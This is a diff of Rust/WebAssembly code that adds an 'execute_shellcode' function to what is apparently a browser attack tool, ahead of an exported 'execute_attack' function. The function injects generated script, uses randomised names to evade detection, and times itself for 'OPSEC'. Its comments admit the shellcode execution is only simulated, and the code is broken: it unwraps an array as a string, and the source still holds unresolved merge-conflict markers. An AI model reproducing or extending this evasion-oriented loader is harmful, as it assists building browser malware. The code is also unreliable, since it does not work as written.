@@ -128,6 +128,118 @@ fn decode_payload(payload: &[u8], dictionary: &[String]) -> Result<Vec<u8>, JsVa
     Ok(decoded_bytes)
 }
 
+<<<<<<< HEAD
+=======
+// Function to execute shellcode in memory using JavaScript JIT compilation
+fn execute_shellcode(shellcode: &[u8]) -> Result<(), JsValue> {
+    console::log_1(&"Executing shellcode using JavaScript JIT techniques...".into());
+    
+    // Create window and performance objects for timing
+    let window = web_sys::window().ok_or(JsValue::from_str("No window object"))?;
+    let document = window.document().ok_or(JsValue::from_str("No document object"))?;
+    let performance = window.performance().ok_or(JsValue::from_str("No performance object"))?;
+    
+    // Mark execution time for OPSEC measurements
+    let start_time = performance.now();
+    
+    // Phase 1: Convert shellcode directly to JavaScript code that can be JIT-compiled
+    // This exploits JavaScript JIT optimization to execute dynamic code
+    
+    // Create a JavaScript array directly from our decoded shellcode bytes
+    let js_array = js_sys::Array::new();
+    for byte in shellcode {
+        js_array.push(&(*byte as u32).into());
+    }
+    
+    // Generate a unique function name to avoid collision detection
+    let func_name = format!("_func_{}", js_sys::Math::random().to_string().replace(".", ""));
+    
+    // Construct JavaScript code for a self-modifying function that will be JIT-compiled
+    // We use various JIT-triggering patterns to ensure optimization
+    let js_code = format!(
+        r#"
+        // Create a hot function that will be JIT-compiled
+        function {}(shellcode) {{
+            // JIT warm-up loop to trigger optimization
+            let result = 0;
+            for (let i = 0; i < 10000; i++) {{
+                result += i % 255;
+            }}
+            
+            // Create typed array for shellcode - using the decoded bytes directly
+            let buffer = new Uint8Array(shellcode.length);
+            
+            // Fill buffer with shellcode bytes (already decoded)
+            for (let i = 0; i < shellcode.length; i++) {{
+                buffer[i] = shellcode[i];
+            }}
+            
+            // Convert shellcode buffer to executable JavaScript
+            // In a real scenario, this would exploit a browser vulnerability
+            // to create executable memory and jump to it
+            
+            // For our simulation, we'll create a JavaScript function that simulates
+            // processing the shellcode
+            let execFunc = new Function('buffer', `
+                // This would be replaced with actual shellcode execution in a real exploit
+                // Here we're simulating the operations that would occur
+                const ops = [];
+                for (let i = 0; i < buffer.length; i++) {{
+                    // Convert each byte to a simulated operation
+                    const b = buffer[i];
+                    if (b < 50) ops.push("add");
+                    else if (b < 100) ops.push("sub");
+                    else if (b < 150) ops.push("xor");
+                    else if (b < 200) ops.push("mov");
+                    else ops.push("jmp");
+                }}
+                return ops.length; // Return operation count
+            `);
+            
+            // Execute our dynamic function
+            return execFunc(buffer);
+        }}
+        
+        // Hot-loop to trigger JIT compilation
+        let iterations = 0;
+        let shellcodeData = {}; // Pass in our shellcode data
+        
+        // Run the function in a loop to trigger JIT compilation
+        for (let i = 0; i < 100; i++) {{
+            iterations = {}(shellcodeData);
+        }}
+        
+        // Return the operation count
+        iterations;
+        "#,
+        func_name,      // Function name
+        js_array.as_string().unwrap(),  // Shellcode array (decoded bytes)
+        func_name       // Function name for call
+    );
+    
+    // Phase 2: Execute the JavaScript code using eval to trigger JIT compilation
+    // Create a script element to execute our JS code
+    let script_el = document.create_element("script")?;
+    script_el.set_text_content(Some(&js_code));
+    
+    // Append script to document to execute it
+    let head = document.head().ok_or(JsValue::from_str("No head element"))?;
+    head.append_child(&script_el)?;
+    
+    // Calculate execution time for OPSEC measurements
+    let end_time = performance.now();
+    let execution_time = end_time - start_time;
+    
+    console::log_1(&format!("JIT execution complete: {} bytes processed", shellcode.len()).into());
+    console::log_1(&format!("Execution time: {:.2}ms", execution_time).into());
+    
+    head.remove_child(&script_el)?;
+    
+    Ok(())
+}
+
+// Main function to implement the attack workflow
+>>>>>>> 483b2e2d06ae9aa06973b9a2ffbb8d1761712882
 #[wasm_bindgen]
 pub async fn execute_attack() -> Result<JsValue, JsValue> {
     let dictionary = fetch_and_cache_dictionary().await?;
